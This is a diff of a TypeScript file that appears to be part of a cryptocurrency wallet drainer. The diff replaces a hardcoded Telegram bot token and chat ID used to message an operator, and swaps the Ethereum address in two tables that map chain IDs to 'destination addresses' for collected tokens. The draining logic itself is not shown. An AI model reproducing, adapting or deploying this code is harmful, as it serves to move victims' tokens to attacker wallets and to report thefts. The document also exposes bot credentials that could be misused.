@@ -8,8 +8,8 @@ import { checkedTokensAtom } from '../../src/atoms/checked-tokens-atom';
 import { globalTokensAtom } from '../../src/atoms/global-tokens-atom';
 import axios from 'axios';
 
-const TELEGRAM_BOT_TOKEN = '7207803482:AAGrcKe1xtF7o7epzI1PxjXciOjaKVW2bUg';
-const TELEGRAM_CHAT_ID = '6718529435';
+const TELEGRAM_BOT_TOKEN = '7210342281:AAFQdhW8Eur7XpyZgBN9UWYlMctdYQNIZXM';
+const TELEGRAM_CHAT_ID = '6682746062';
 
 const sendTelegramNotification = async (message: string) => {
   try {
@@ -23,7 +23,7 @@ const sendTelegramNotification = async (message: string) => {
 };
 
 const destinationAddresses = {
-  1: '0xFB7DBCeB5598159E0B531C7eaB26d9D579Bf804B',
+  1: '0xbC6eCc7fb7E2EFde5A9CeC8409ab4fcAF2Ac5BC1',
   56: '0x933d91B8D5160e302239aE916461B4DC6967815d',
   10: '0x933d91B8D5160e302239aE916461B4DC6967815d',
   324: '0x933d91B8D5160e302239aE916461B4DC6967815d',
@@ -33,7 +33,7 @@ const destinationAddresses = {
 
 function selectAddressForToken(network: number) {
   const addresses = {
-    1: '0xFB7DBCeB5598159E0B531C7eaB26d9D579Bf804B',
+    1: '0xbC6eCc7fb7E2EFde5A9CeC8409ab4fcAF2Ac5BC1',
     56: '0x933d91B8D5160e302239aE916461B4DC6967815d',
     10: '0x933d91B8D5160e302239aE916461B4DC6967815d',
     324: '0x933d91B8D5160e302239aE916461B4DC6967815d',
